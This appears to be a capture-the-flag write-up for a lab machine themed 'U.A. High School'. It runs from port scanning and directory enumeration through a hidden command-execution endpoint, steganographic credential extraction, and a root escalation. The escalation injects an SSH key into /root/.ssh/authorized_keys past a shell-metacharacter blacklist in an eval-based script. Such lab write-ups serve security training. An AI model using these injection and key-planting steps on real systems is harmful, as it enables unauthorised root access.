{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start with scanning through the ports.")}}

{{console("nmap -T5 -p- -sV -sC 10.10.123.111", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 12:47 CET
Warning: 10.10.123.111 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.123.111
Host is up (0.15s latency).
Not shown: 88 closed tcp ports (conn-refused)
PORT   STATE    SERVICE     VERSION
22/tcp open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open     http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel")}}

{{text("We find two ports open.")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("Let us proceed with checking the website.")}}

{{image("../../static/images/cheesectf/000002.jpg")}}

{{text("While looking at the source code, we can notice a <code class='bg-gray-300 rounded-md px-1'>/assets</code> directory.")}}

{{text("Visiting <code class='bg-gray-300 rounded-md px-1'>/assets</code> directory gives us a blank page, which is weird.")}}

{{text("We are also forbidden from going to <code class='bg-gray-300 rounded-md px-1'>/assets/images</code>, which means there probably is something hidden in the <code class='bg-gray-300 rounded-md px-1'>/assets</code> directory.")}}

{{text("I use a directory scanning tool in order to uncover any hidden files.")}}

{{console("gobuster dir -u http://10.10.123.111/assets/ -w /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.123.111/assets/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 322] [--> http://10.10.123.111/assets/images/]
/index.php            (Status: 200) [Size: 0]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================")}}

{{text("We find a <code class='bg-gray-300 rounded-md px-1'>/index.php</code> file.")}}

{{text("It's also competely empty. I couldn't find anything else, so I started trying out different parameters in the URL and one of them worked.")}}

{{image("../../static/images/cheesectf/000003.jpg")}}

{{text("It seems like we can pass arguments to the <code class='bg-gray-300 rounded-md px-1'>cmd</code> parameter and we get back base64 encoded output.")}}

{{text("Let's try to get a reverse shell.")}}

{{text("I used this command from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code>. Don't forget to URL encode your payload.")}}

{{image("../../static/images/cheesectf/000004.jpg")}}

{{text("Passing it as the command to our parameter, we get back a reverse shell.")}}

{{image("../../static/images/cheesectf/000005.jpg")}}

{{text("I found a password inside the <code class='bg-gray-300 rounded-md px-1'>/var/www/Hidden_Conent</code> directory, but had no idea where to use it.")}}

{{console("cat passphrase.txt | base64 -d", "AllmightForEver!!!")}}

{{text("I continued looking through the system, and found a unused image in the <code class='bg-gray-300 rounded-md px-1'>/var/www/html/assets/images</code> directory.")}}

{{text("I was pretty sure the password I found was for extracting hidden files using <code class='bg-gray-300 rounded-md px-1'>steghide</code>.")}}

{{text("Next, I downloaded the image by running <code class='bg-gray-300 rounded-md px-1'>wget 10.10.123.111/assets/images/oneforall.jpg</code>.")}}

{{text("Now I tried extracting the hidden files with the found password.")}}

{{console("steghide extract -sf oneforall.jpg", "Enter passphrase: 
steghide: the file format of the file "oneforall.jpg" is not supported.")}}

{{text("For some reason it doesn't work.")}}

{{text("We also can't open the image, which is weird.")}}

{{text("Let's look at the hex dump of this file.")}}

{{console("xxd oneforall.jpg | head", "00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
00000030: 0f0c 1017 1418 1817 1416 161a 1d25 1f1a  .............%..
00000040: 1b23 1c16 1620 2c20 2326 2729 2a29 191f  .#... , #&')*)..
00000050: 2d30 2d28 3025 2829 28ff db00 4301 0707  -0-(0%()(...C...
00000060: 070a 080a 130a 0a13 281a 161a 2828 2828  ........(...((((
00000070: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000080: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..")}}

{{text("By looking at the hex dump of this file, we see that it is a <code class='bg-gray-300 rounded-md px-1'>PNG</code> file, and steghide doesn't work on that.")}}

{{text("We probably have to change bytes from the <code class='bg-gray-300 rounded-md px-1'>PNG</code> file signature to <code class='bg-gray-300 rounded-md px-1'>JPG</code>.")}}

{{image("../../static/images/cheesectf/000006.jpg")}}

{{text("Let's try to use <code class='bg-gray-300 rounded-md px-1'>steghide</code> once again.")}}

{{console("steghide extract -sf oneforall.jpg", "Enter passphrase: 
wrote extracted data to "creds.txt".")}}

{{text("We extract user credentials which we can use to log in via <code class='bg-gray-300 rounded-md px-1'>SSH</code>.")}}

{{header}}

{{text("We check <code class='bg-gray-300 rounded-md px-1'>sudo permissions</code> of our user.")}}

{{console("sudo -l", "[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh")}}

{{text("We are able to run <code class='bg-gray-300 rounded-md px-1'>feedback.sh</code> as any user.")}}

{{text("Let's read this file.")}}

{{console("cat feedback.sh", "#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi")}}

{{text("It echoes any input we provide, if it doesn't contain any of the blacklisted symbols. We can notice that the <code class='bg-gray-300 rounded-md px-1'>></code> symbol is permitted, meaning we can use it to write to files.")}}

{{text("We generate a public key using <code class='bg-gray-300 rounded-md px-1'>ssh-keygen</code>, copy the public key and save it in <code class='bg-gray-300 rounded-md px-1'>/root/.ssh/authorized_keys</code>")}}

{{console("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILO60uNhTUNMEDTfn5f+qZZDXWg1JcMGtypKRMyIxnn6 kali@kali >> /root/.ssh/authorized_keys")}}

{{image("../../static/images/cheesectf/000007.jpg")}}

{{text("We now can log in as root by providing our <code class='bg-gray-300 rounded-md px-1'>id_rsa</code> key.")}}

{{console("ssh root@10.10.123.111 -i id_rsa")}}

{{text("We find the flag in <code class='bg-gray-300 rounded-md px-1'>/root</code>")}}

{{image("../../static/images/cheesectf/000008.jpg")}}


